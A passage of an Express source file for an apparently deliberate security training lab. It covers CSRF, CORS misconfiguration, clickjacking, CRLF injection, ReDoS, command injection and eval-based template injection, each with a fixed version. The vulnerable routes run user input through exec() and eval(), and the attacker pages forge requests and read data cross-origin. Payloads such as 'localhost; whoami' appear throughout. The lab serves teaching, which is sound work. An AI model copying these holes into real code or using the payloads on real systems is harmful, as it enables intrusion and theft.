app.use("/csrf-fixed", express.urlencoded({ extended: true }));

app.get("/csrf", (req, res) => {
  res.set("Set-Cookie", "session=alice; Path=/");
  const email = csrfUsers.alice.email;
  res.type("html").send(`
    <h1>Lab 23a: CSRF — No Token (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Logged in as <strong>alice</strong>. Current email: <strong>${escapeHtml(email)}</strong></p>
    <h3>Change Email</h3>
    <form method="post">
      <label>New email: <input name="email" value="alice@newaddress.com" size="30"></label>
      <button type="submit">Update Email</button>
    </form>
    <p style="color:#c00;">&#9888; Now visit <a href="/csrf-attacker" target="_blank">/csrf-attacker</a> in a new tab — it will change your email without your consent!</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: no CSRF token — any site can submit this form</span>
app.<span style="color:#dcdcaa;">post</span>(<span style="color:#ce9178;">"/csrf"</span>, (req, res) =&gt; {
  <span style="color:#9cdcfe;">const</span> session = req.cookies.session;  <span style="color:#6a9955;">// Cookie sent automatically</span>
  <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">users[session].email = req.body.email;</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>
  <span style="color:#6a9955;">// No CSRF token checked — request could come from any origin</span>
});</code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Alice is logged in (session cookie is set)</li>
      <li>Alice visits attacker's page (<code>/csrf-attacker</code>)</li>
      <li>Attacker page auto-submits a hidden form to <code>/csrf</code></li>
      <li>Browser includes Alice's session cookie automatically</li>
      <li>Server processes the request — Alice's email is changed</li>
    </ol>
  `);
});

app.post("/csrf", (req, res) => {
  csrfUsers.alice.email = req.body.email || csrfUsers.alice.email;
  res.type("html").send(`
    <h1>Lab 23a: CSRF — Email Updated</h1>
    <p><a href="/">Back to labs</a> | <a href="/csrf">Back to form</a></p>
    <p>Email changed to: <strong>${escapeHtml(csrfUsers.alice.email)}</strong></p>
    ${req.body.email === "hacker@evil.com" ? '<p style="color:red;font-weight:bold;">&#9888; This was a CSRF attack! The email was changed by the attacker page.</p>' : ""}
  `);
});

app.get("/csrf-attacker", (req, res) => {
  res.type("html").send(`
    <h1>Lab 23: Attacker Page</h1>
    <p style="color:#c00;">This page simulates a malicious website.</p>
    <p>If you're logged in to the vulnerable app, this auto-submitting form will change your email:</p>
    <form id="csrf-form" action="http://localhost:3000/csrf" method="POST" style="display:none;">
      <input name="email" value="hacker@evil.com">
    </form>
    <script>
      // Auto-submit after 1 second so you can see the page first
      setTimeout(() => document.getElementById("csrf-form").submit(), 1000);
    </script>
    <p>Auto-submitting in 1 second...</p>
    <p><small>In a real attack, the form would be completely hidden on an innocent-looking page.</small></p>
  `);
});

app.get("/csrf-fixed", (req, res) => {
  const token = crypto.randomUUID();
  csrfTokens.set(token, true);
  res.set("Set-Cookie", "session_fixed=alice; Path=/; SameSite=Strict");
  const email = csrfUsers.alice.email;
  res.type("html").send(`
    <h1>Lab 23b: CSRF — Token Protected (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Logged in as <strong>alice</strong>. Current email: <strong>${escapeHtml(email)}</strong></p>
    <h3>Change Email</h3>
    <form method="post">
      <input type="hidden" name="csrf_token" value="${token}">
      <label>New email: <input name="email" value="alice@newaddress.com" size="30"></label>
      <button type="submit">Update Email</button>
    </form>
    <p>The attacker page cannot forge this form because it doesn't know the CSRF token.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: CSRF token required and validated</span>
app.<span style="color:#dcdcaa;">get</span>(<span style="color:#ce9178;">"/csrf-fixed"</span>, (req, res) =&gt; {
  <span style="color:#9cdcfe;">const</span> token = crypto.<span style="color:#dcdcaa;">randomUUID</span>();
  tokens.<span style="color:#dcdcaa;">set</span>(token, <span style="color:#569cd6;">true</span>);
  <span style="color:#6a9955;">// Embed token in hidden form field</span>
});

app.<span style="color:#dcdcaa;">post</span>(<span style="color:#ce9178;">"/csrf-fixed"</span>, (req, res) =&gt; {
  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">if (!tokens.delete(req.body.csrf_token)) {</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
    <span style="color:#c586c0;">return</span> res.status(403).send(<span style="color:#ce9178;">"Invalid CSRF token"</span>);
  }
  <span style="color:#6a9955;">// Token valid and consumed — process request</span>
  <span style="color:#6a9955;">// Also: SameSite=Strict cookie prevents cross-origin submission</span>
});</code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p>Two layers of protection:</p>
      <ol>
        <li><strong>CSRF token:</strong> A random, per-request token embedded in the form.
        The attacker cannot read it (same-origin policy prevents reading the page).</li>
        <li><strong>SameSite=Strict cookie:</strong> The browser won't send the cookie
        on cross-origin form submissions at all.</li>
      </ol>
    </details>
  `);
});

app.post("/csrf-fixed", (req, res) => {
  if (!csrfTokens.delete(req.body.csrf_token)) {
    return res.type("html").status(403).send(`
      <h1>Lab 23b: CSRF — Blocked</h1>
      <p><a href="/">Back to labs</a> | <a href="/csrf-fixed">Back to form</a></p>
      <p style="color:green;font-weight:bold;">&#10004; CSRF attack blocked! Invalid or missing token.</p>
    `);
  }
  csrfUsers.alice.email = req.body.email || csrfUsers.alice.email;
  res.type("html").send(`
    <h1>Lab 23b: CSRF — Email Updated (Fixed)</h1>
    <p><a href="/">Back to labs</a> | <a href="/csrf-fixed">Back to form</a></p>
    <p style="color:green;">&#10004; Valid CSRF token. Email changed to: <strong>${escapeHtml(csrfUsers.alice.email)}</strong></p>
  `);
});

/* ========================================================================
   LAB 30 — CORS Misconfiguration (CWE-942)
   ======================================================================== */
app.get("/cors-misconfig", (req, res) => {
  res.type("html").send(`
    <h1>Lab 30: CORS Misconfiguration (CWE-942)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>This lab demonstrates how wildcard CORS headers expose API data to any website.</p>

    <h3>Endpoints</h3>
    <ul>
      <li><a class="vuln" href="/cors-api-vuln">/cors-api-vuln</a> — API with <code>Access-Control-Allow-Origin: *</code> (vulnerable)</li>
      <li><a class="safe" href="/cors-api-fixed">/cors-api-fixed</a> — API with allowlisted origin (fixed)</li>
      <li><a class="vuln" href="/cors-attacker">/cors-attacker</a> — Attacker page that reads the API cross-origin</li>
    </ul>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: any origin can read the response</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">res.set("Access-Control-Allow-Origin", "*");</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>
res.json({ user: <span style="color:#ce9178;">"alice"</span>, apiKey: <span style="color:#ce9178;">"sk-secret-123"</span> });

<span style="color:#6a9955;">// Fixed: only trusted origins</span>
<span style="color:#9cdcfe;">const</span> allowed = [<span style="color:#ce9178;">"https://myapp.com"</span>];
<span style="color:#c586c0;">if</span> (allowed.includes(req.headers.origin)) {
  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">res.set("Access-Control-Allow-Origin", req.headers.origin);</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
}</code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>API returns sensitive data with <code>Access-Control-Allow-Origin: *</code></li>
      <li>Attacker hosts a page that uses <code>fetch()</code> to read the API</li>
      <li>Browser allows the cross-origin read because of the wildcard header</li>
      <li>Attacker's JavaScript can read and exfiltrate the response</li>
    </ol>

    <details>
      <summary>Why is this dangerous?</summary>
      <p>Without CORS headers, the browser's <strong>Same-Origin Policy</strong> blocks
      cross-origin JavaScript from reading API responses. The wildcard <code>*</code>
      disables this protection entirely.</p>
      <p><strong>Best practices:</strong></p>
      <ul>
        <li>Never use <code>*</code> for APIs that return sensitive data</li>
        <li>Allowlist specific trusted origins</li>
        <li>Never reflect the <code>Origin</code> header without validation</li>
        <li>Be careful with <code>Access-Control-Allow-Credentials: true</code></li>
      </ul>
    </details>
  `);
});

app.get("/cors-api-vuln", (req, res) => {
  res.set("Access-Control-Allow-Origin", "*");
  res.json({ user: "alice", email: "alice@company.com", apiKey: "sk-secret-key-12345", internalId: "usr_a1b2c3" });
});

app.get("/cors-api-fixed", (req, res) => {
  const allowedOrigins = ["https://myapp.com", "https://admin.myapp.com"];
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.set("Access-Control-Allow-Origin", origin);
  }
  res.json({ user: "alice", email: "alice@company.com", apiKey: "sk-secret-key-12345", internalId: "usr_a1b2c3" });
});

app.get("/cors-attacker", (req, res) => {
  res.type("html").send(`
    <h1>Lab 30: CORS Attacker Page</h1>
    <p style="color:#c00;">This simulates a malicious website reading your API data cross-origin.</p>
    <button onclick="stealData()">Steal Data from Vulnerable API</button>
    <button onclick="stealFixed()">Try Fixed API</button>
    <h3>Stolen Data:</h3>
    <pre id="result" ${PRE}>Click a button above...</pre>
    <script>
      async function stealData() {
        try {
          const r = await fetch("http://localhost:3000/cors-api-vuln");
          const data = await r.json();
          document.getElementById("result").textContent =
            "SUCCESS — Data stolen:\\n" + JSON.stringify(data, null, 2);
        } catch (e) {
          document.getElementById("result").textContent = "Blocked: " + e.message;
        }
      }
      async function stealFixed() {
        try {
          const r = await fetch("http://localhost:3000/cors-api-fixed");
          const data = await r.json();
          document.getElementById("result").textContent =
            "Data read:\\n" + JSON.stringify(data, null, 2);
        } catch (e) {
          document.getElementById("result").textContent =
            "BLOCKED by CORS — " + e.message + "\\n\\nThe fixed API does not allow this origin.";
        }
      }
    </script>
  `);
});

/* ========================================================================
   LAB 31 — Clickjacking (CWE-1021)
   ======================================================================== */
app.get("/clickjack-target", (req, res) => {
  // No X-Frame-Options — can be framed
  res.type("html").send(`
    <html><body style="font-family:system-ui;padding:2rem;">
    <h1>My Account Settings</h1>
    <p>Logged in as <strong>alice</strong></p>
    <form onsubmit="alert('Account deleted!');return false;">
      <button type="submit" style="background:red;color:white;padding:10px 20px;font-size:1.1em;border:none;border-radius:4px;cursor:pointer;">
        Delete My Account
      </button>
    </form>
    <p><a href="/">Back to labs</a></p>
    </body></html>
  `);
});

app.get("/clickjack", (req, res) => {
  res.type("html").send(`
    <h1>Lab 31a: Clickjacking Attack (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p style="color:#c00;">The "Win a Prize" button is positioned over the "Delete Account" button in a transparent iframe.</p>
    <div style="position:relative;width:500px;height:250px;margin:2rem 0;">
      <iframe src="/clickjack-target" style="position:absolute;top:0;left:0;width:500px;height:250px;opacity:0.3;z-index:2;border:2px solid red;"></iframe>
      <div style="position:absolute;top:145px;left:22px;z-index:1;">
        <button style="background:green;color:white;padding:10px 20px;font-size:1.1em;border:none;border-radius:4px;cursor:pointer;">
          &#127881; Click to Win a Prize!
        </button>
      </div>
    </div>
    <p><em>The iframe opacity is set to 0.3 so you can see the overlay. In a real attack, it would be 0 (invisible).</em></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: no framing protection</span>
app.<span style="color:#dcdcaa;">get</span>(<span style="color:#ce9178;">"/account"</span>, (req, res) =&gt; {
  <span style="color:#6a9955;">// No X-Frame-Options header</span>
  <span style="color:#6a9955;">// No CSP frame-ancestors directive</span>
  <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">res.send(accountPage);</span>  <span style="color:#f44747;">// &lt;-- THE BUG: page can be embedded in any iframe</span>
});

<span style="color:#6a9955;">// Attacker page:</span>
&lt;div style=<span style="color:#ce9178;">"position:relative"</span>&gt;
  &lt;iframe src=<span style="color:#ce9178;">"http://victim.com/account"</span> style=<span style="color:#ce9178;">"opacity:0"</span>&gt;&lt;/iframe&gt;
  &lt;button&gt;Win a Prize!&lt;/button&gt;  <span style="color:#6a9955;">// Positioned over the "Delete" button</span>
&lt;/div&gt;</code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker embeds the victim site in a transparent iframe</li>
      <li>Positions an enticing button underneath the target button</li>
      <li>User thinks they're clicking "Win a Prize"</li>
      <li>They're actually clicking "Delete Account" in the invisible iframe</li>
    </ol>
  `);
});

app.get("/clickjack-fixed", (req, res) => {
  res.set("X-Frame-Options", "DENY");
  res.set("Content-Security-Policy", "frame-ancestors 'none'");
  res.type("html").send(`
    <h1>Lab 31b: Clickjacking — Protected (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <p style="color:green;">&#10004; This page sends <code>X-Frame-Options: DENY</code> and
    <code>Content-Security-Policy: frame-ancestors 'none'</code>.</p>
    <p>Try embedding this page in an iframe — the browser will refuse:</p>
    <iframe src="/clickjack-fixed" style="width:400px;height:100px;border:2px solid green;"></iframe>
    <p><em>The iframe above should show an error or be blank.</em></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: prevent framing</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">res.set("X-Frame-Options", "DENY");</span>  <span style="color:#6a9955;">// &lt;-- FIX 1</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">res.set("Content-Security-Policy", "frame-ancestors 'none'");</span>  <span style="color:#6a9955;">// &lt;-- FIX 2</span></code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p><code>X-Frame-Options: DENY</code> tells the browser to never allow this page
      to be embedded in a frame. <code>frame-ancestors 'none'</code> is the modern CSP
      equivalent.</p>
      <p>Use both for backward compatibility. Options:</p>
      <ul>
        <li><code>DENY</code> — never allow framing</li>
        <li><code>SAMEORIGIN</code> — only allow framing by same origin</li>
        <li><code>frame-ancestors 'self'</code> — CSP equivalent of SAMEORIGIN</li>
      </ul>
    </details>
  `);
});

/* ========================================================================
   LAB 32 — CRLF / Header Injection (CWE-113)
   ======================================================================== */
app.use("/crlf", express.urlencoded({ extended: true }));
app.use("/crlf-fixed", express.urlencoded({ extended: true }));

app.get("/crlf", (req, res) => {
  const lang = req.query.lang || "en";
  // Simulate what a vulnerable framework would do
  const rawHeader = `lang=${lang}`;
  const hasCRLF = /[\r\n]/.test(lang);
  res.type("html").send(`
    <h1>Lab 32a: CRLF / Header Injection (Vulnerable — Simulated)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>This simulates a framework that allows newlines in HTTP headers.</p>
    <form method="get">
      <label>Language: <input name="lang" value="${escapeHtml(lang)}" size="40"></label>
      <button type="submit">Set Language</button>
    </form>
    <p style="color:#c00;">&#9888; Try: <code>en%0d%0aSet-Cookie:%20admin=true</code></p>
    <p><a href="/crlf?lang=en%0d%0aSet-Cookie:%20admin=true">Click to inject a Set-Cookie header</a></p>

    <h3>Raw Header Value</h3>
    <pre ${PRE}>${escapeHtml(rawHeader)}</pre>
    ${hasCRLF ? `
      <p style="color:red;font-weight:bold;">&#9888; CRLF detected! In a vulnerable framework, this would inject new headers:</p>
      <pre style="background:#2d1111;color:#f0a0a0;padding:1rem;border-radius:6px;">HTTP/1.1 200 OK
Content-Type: text/html
X-Language: ${escapeHtml(rawHeader.split("\n")[0])}
<span style="color:#ff6b6b;font-weight:bold;">${escapeHtml(lang.split(/[\r\n]+/).slice(1).join("\n"))}</span>
</pre>
      <p style="color:red;">The injected line(s) above would be treated as new HTTP headers.</p>
    ` : '<p style="color:green;">No CRLF characters detected — header is safe.</p>'}
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable (in older frameworks like PHP, Python 2, etc.):</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">res.setHeader("X-Language", userInput);</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// If userInput = "en\\r\\nSet-Cookie: admin=true"</span>
<span style="color:#6a9955;">// The response includes an attacker-controlled Set-Cookie header!</span>

<span style="color:#6a9955;">// Note: Express 5+ blocks CRLF in headers automatically.</span>
<span style="color:#6a9955;">// This lab simulates what happens in vulnerable frameworks.</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker provides input with <code>\\r\\n</code> (CRLF) characters</li>
      <li>Server sets a header using the unsanitized input</li>
      <li>CRLF terminates the current header and starts a new one</li>
      <li>Attacker injects arbitrary headers (Set-Cookie, Location, etc.)</li>
    </ol>
  `);
});

app.get("/crlf-fixed", (req, res) => {
  const lang = req.query.lang || "en";
  const sanitized = lang.replace(/[\r\n]/g, "");
  res.type("html").send(`
    <h1>Lab 32b: CRLF / Header Injection — Sanitized (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="get">
      <label>Language: <input name="lang" value="${escapeHtml(lang)}" size="40"></label>
      <button type="submit">Set Language</button>
    </form>
    <p><a href="/crlf-fixed?lang=en%0d%0aSet-Cookie:%20admin=true">Try the CRLF injection payload</a></p>

    <h3>Sanitized Header Value</h3>
    <pre ${PRE}>lang=${escapeHtml(sanitized)}</pre>
    ${lang !== sanitized
      ? '<p style="color:green;">&#10004; CRLF characters were stripped. Injection prevented.</p>'
      : '<p style="color:green;">No CRLF characters found — input was already safe.</p>'}
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: strip CRLF characters before using in headers</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const sanitized = userInput.replace(/[\\r\\n]/g, "");</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
res.setHeader(<span style="color:#ce9178;">"X-Language"</span>, sanitized);</code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p>Stripping <code>\\r</code> and <code>\\n</code> characters prevents the attacker
      from terminating the current header and injecting new ones.</p>
      <p><strong>Modern frameworks handle this automatically:</strong></p>
      <ul>
        <li>Express 5+ throws an error if headers contain CRLF</li>
        <li>Most modern frameworks reject or strip CRLF</li>
        <li>Legacy apps (PHP, older Python/Java) may still be vulnerable</li>
      </ul>
    </details>
  `);
});

/* ========================================================================
   LAB 34 — ReDoS (CWE-1333)
   ======================================================================== */
app.use("/redos", express.urlencoded({ extended: true }));
app.use("/redos-fixed", express.urlencoded({ extended: true }));

app.get("/redos", (req, res) => {
  res.type("html").send(`
    <h1>Lab 34a: ReDoS — Catastrophic Backtracking (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Test an email validation regex with catastrophic backtracking:</p>
    <form method="post">
      <label>Email: <input name="email" value="aaaaaaaaaaaaaaaaaaaaa!" size="40"></label>
      <button type="submit">Validate</button>
    </form>
    <p style="color:#c00;">&#9888; The payload <code>aaaaaaaaaaaaaaaaaaaaa!</code> causes exponential backtracking.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: nested quantifiers cause catastrophic backtracking</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">const emailRegex = /^([a-zA-Z0-9]+)+@/;</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// The nested quantifiers ([...]+)+ create exponential backtracking</span>
<span style="color:#6a9955;">// on non-matching input like "aaaaaaaaaaaaaaaaaaaaa!"</span>
<span style="color:#6a9955;">// Each 'a' can be matched by the inner or outer group,</span>
<span style="color:#6a9955;">// creating 2^n possible ways to fail.</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Server uses a regex with nested quantifiers for email validation</li>
      <li>Attacker sends a string of <code>a</code>s followed by <code>!</code></li>
      <li>The regex engine tries 2<sup>n</sup> paths before failing</li>
      <li>Server thread is blocked — Denial of Service</li>
    </ol>
  `);
});

app.post("/redos", (req, res) => {
  const email = req.body.email || "";
  const vulnRegex = /^([a-zA-Z0-9]+)+@/;
  const maxTime = 2000;
  const start = Date.now();

  // Safety: run in a bounded way using a manual timeout check
  let matched = false;
  let timedOut = false;

  // We run the regex but cap observation time
  const timer = setTimeout(() => { timedOut = true; }, maxTime);
  try {
    matched = vulnRegex.test(email);
  } catch (e) {
    // ignore
  }
  clearTimeout(timer);
  const elapsed = Date.now() - start;

  res.type("html").send(`
    <h1>Lab 34a: ReDoS — Result</h1>
    <p><a href="/">Back to labs</a> | <a href="/redos">Try again</a></p>
    <p>Input: <code>${escapeHtml(email)}</code></p>
    <p>Regex: <code>/^([a-zA-Z0-9]+)+@/</code></p>
    <p>Result: ${matched ? "Matched" : "No match"}</p>
    <p>Time: <strong>${elapsed}ms</strong></p>
    ${elapsed > 100
      ? `<p style="color:red;font-weight:bold;">&#9888; Regex took ${elapsed}ms! This is catastrophic backtracking.</p>
         <p>With more characters, the time doubles with each additional character (exponential).</p>`
      : '<p style="color:green;">Fast execution — no backtracking issue with this input.</p>'}
  `);
});

app.get("/redos-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 34b: ReDoS — Linear Regex (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="post">
      <label>Email: <input name="email" value="aaaaaaaaaaaaaaaaaaaaa!" size="40"></label>
      <button type="submit">Validate</button>
    </form>
    <p>Try the same payload — the fixed regex completes instantly.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: no nested quantifiers — linear time complexity</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>

<span style="color:#6a9955;">// No nested quantifiers — each character is matched exactly once.</span>
<span style="color:#6a9955;">// Time complexity is O(n), not O(2^n).</span></code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p>The vulnerable regex <code>/^([a-zA-Z0-9]+)+@/</code> has <strong>nested
      quantifiers</strong> — the <code>+</code> inside the group and the <code>+</code>
      on the group itself. This creates exponential backtracking.</p>
      <p>The fixed regex <code>/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/</code>
      has <strong>no nesting</strong> — each quantifier applies to a character class directly.</p>
      <p><strong>Prevention tips:</strong></p>
      <ul>
        <li>Avoid nested quantifiers: <code>(a+)+</code>, <code>(a*)*</code>, <code>(a|b)*</code></li>
        <li>Use tools like <a href="https://regex101.com">regex101.com</a> to test for backtracking</li>
        <li>Set regex timeouts in production</li>
        <li>Consider RE2 (no backtracking by design)</li>
      </ul>
    </details>
  `);
});

app.post("/redos-fixed", (req, res) => {
  const email = req.body.email || "";
  const safeRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  const start = Date.now();
  const matched = safeRegex.test(email);
  const elapsed = Date.now() - start;

  res.type("html").send(`
    <h1>Lab 34b: ReDoS — Result (Fixed)</h1>
    <p><a href="/">Back to labs</a> | <a href="/redos-fixed">Try again</a></p>
    <p>Input: <code>${escapeHtml(email)}</code></p>
    <p>Regex: <code>/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/</code></p>
    <p>Result: ${matched ? "Matched" : "No match"}</p>
    <p>Time: <strong>${elapsed}ms</strong></p>
    <p style="color:green;">&#10004; Completed in ${elapsed}ms — linear time, no backtracking.</p>
  `);
});

/* ========================================================================
   LAB 21 — Command Injection (CWE-78)
   ======================================================================== */
const { exec, execFile } = require("child_process");

app.use("/cmdi", express.urlencoded({ extended: true }));
app.use("/cmdi-fixed", express.urlencoded({ extended: true }));

app.get("/cmdi", (req, res) => {
  res.type("html").send(`
    <h1>Lab 21a: Command Injection (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Enter a hostname to ping:</p>
    <form method="post">
      <label>Hostname: <input name="hostname" value="localhost" size="30"></label>
      <button type="submit">Ping</button>
    </form>
    <p style="color:#c00;">&#9888; Try: <code>localhost; whoami</code> or <code>localhost; echo HACKED</code></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: string concatenation into shell command</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">exec("ping -c 1 " + hostname, callback);</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// exec() runs through /bin/sh, which interprets ; | &amp;&amp; &#96; $() etc.</span>
<span style="color:#6a9955;">// Input: "localhost; whoami" becomes: ping -c 1 localhost; whoami</span>
<span style="color:#6a9955;">// The shell runs BOTH commands.</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Application builds a shell command with user input</li>
      <li>Attacker appends <code>; whoami</code> to the hostname</li>
      <li><code>exec()</code> passes the full string to the shell</li>
      <li>Shell interprets <code>;</code> as a command separator</li>
      <li>Both <code>ping</code> and <code>whoami</code> execute</li>
    </ol>
  `);
});

app.post("/cmdi", (req, res) => {
  const hostname = req.body.hostname || "localhost";
  exec("ping -c 1 " + hostname, { timeout: 3000, maxBuffer: 4096 }, (err, stdout, stderr) => {
    const output = (stdout || "") + (stderr || "");
    const injected = /[;&|`$()]/.test(hostname);
    res.type("html").send(`
      <h1>Lab 21a: Command Injection — Result</h1>
      <p><a href="/">Back to labs</a> | <a href="/cmdi">Try again</a></p>
      <p>Command: <code>ping -c 1 ${escapeHtml(hostname)}</code></p>
      ${injected ? '<p style="color:red;font-weight:bold;">&#9888; Shell metacharacters detected! Additional commands may have executed.</p>' : ""}
      <h3>Output</h3>
      <pre ${PRE}>${escapeHtml(output || (err ? err.message : "No output"))}</pre>
    `);
  });
});

app.get("/cmdi-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 21b: Command Injection — execFile + Allowlist (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="post">
      <label>Hostname: <input name="hostname" value="localhost" size="30"></label>
      <button type="submit">Ping</button>
    </form>
    <p>Try <code>localhost; whoami</code> — it will be rejected.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: allowlist + execFile (no shell interpretation)</span>
<span style="color:#c586c0;">if</span> (<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">!/^[a-zA-Z0-9.-]+$/.test(hostname)</span>) {  <span style="color:#6a9955;">// &lt;-- FIX 1: allowlist</span>
  <span style="color:#c586c0;">return</span> res.status(400).send(<span style="color:#ce9178;">"Invalid hostname"</span>);
}
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">execFile("ping", ["-c", "1", hostname], callback);</span>  <span style="color:#6a9955;">// &lt;-- FIX 2: no shell</span>

<span style="color:#6a9955;">// execFile() does NOT use a shell — arguments are passed directly.</span>
<span style="color:#6a9955;">// Even if the allowlist is bypassed, ; and | are treated as literals.</span></code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p>Two layers of defense:</p>
      <ol>
        <li><strong>Input allowlist:</strong> Only alphanumeric characters, dots, and hyphens
        are allowed. Shell metacharacters (<code>; | &amp; &#96; $()</code>) are rejected.</li>
        <li><strong>execFile():</strong> Unlike <code>exec()</code>, <code>execFile()</code>
        does NOT invoke a shell. Arguments are passed directly to the process as an array,
        so shell metacharacters have no special meaning.</li>
      </ol>
    </details>
  `);
});

app.post("/cmdi-fixed", (req, res) => {
  const hostname = req.body.hostname || "localhost";
  if (!/^[a-zA-Z0-9.-]+$/.test(hostname)) {
    return res.type("html").status(400).send(`
      <h1>Lab 21b: Command Injection — Blocked</h1>
      <p><a href="/">Back to labs</a> | <a href="/cmdi-fixed">Try again</a></p>
      <p style="color:green;font-weight:bold;">&#10004; Rejected! Input <code>${escapeHtml(hostname)}</code> contains invalid characters.</p>
      <p>Only alphanumeric characters, dots, and hyphens are allowed.</p>
    `);
  }
  execFile("ping", ["-c", "1", hostname], { timeout: 3000, maxBuffer: 4096 }, (err, stdout, stderr) => {
    res.type("html").send(`
      <h1>Lab 21b: Command Injection — Result (Fixed)</h1>
      <p><a href="/">Back to labs</a> | <a href="/cmdi-fixed">Try again</a></p>
      <p>Command: <code>execFile("ping", ["-c", "1", "${escapeHtml(hostname)}"])</code></p>
      <p style="color:green;">&#10004; Executed safely via execFile (no shell).</p>
      <h3>Output</h3>
      <pre ${PRE}>${escapeHtml((stdout || "") + (stderr || "") || (err ? err.message : "No output"))}</pre>
    `);
  });
});

/* ========================================================================
   LAB 22 — Server-Side Template Injection (CWE-1336)
   ======================================================================== */
app.use("/ssti", express.urlencoded({ extended: true }));
app.use("/ssti-fixed", express.urlencoded({ extended: true }));

app.get("/ssti", (req, res) => {
  res.type("html").send(`
    <h1>Lab 22a: SSTI — Template Injection (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Enter your name for a greeting:</p>
    <form method="post">
      <label>Name: <input name="name" value="World" size="40"></label>
      <button type="submit">Greet</button>
    </form>
    <p style="color:#c00;">&#9888; Try: <code>&#36;{7*7}</code> or <code>&#36;{process.env.HOME}</code></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: eval() interprets template literals from user input</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">const result = eval(&#96;&#96;Hello, &#36;{userInput}!&#96;&#96;);</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// eval() processes template expressions like &#36;{7*7}</span>
<span style="color:#6a9955;">// This allows arbitrary code execution on the server.</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Server uses <code>eval()</code> with a template literal to build a greeting</li>
      <li>Attacker enters <code>&#36;{7*7}</code> as their name</li>
      <li><code>eval()</code> processes the expression: <code>Hello, 49!</code></li>
      <li>Attacker escalates to <code>&#36;{process.env.HOME}</code> — leaks server paths</li>
    </ol>
  `);
});

app.post("/ssti", (req, res) => {
  const name = req.body.name || "World";
  let result, error;
  try {
    result = eval("`Hello, " + name + "!`");
  } catch (e) {
    error = e.message;
  }
  res.type("html").send(`
    <h1>Lab 22a: SSTI — Result</h1>
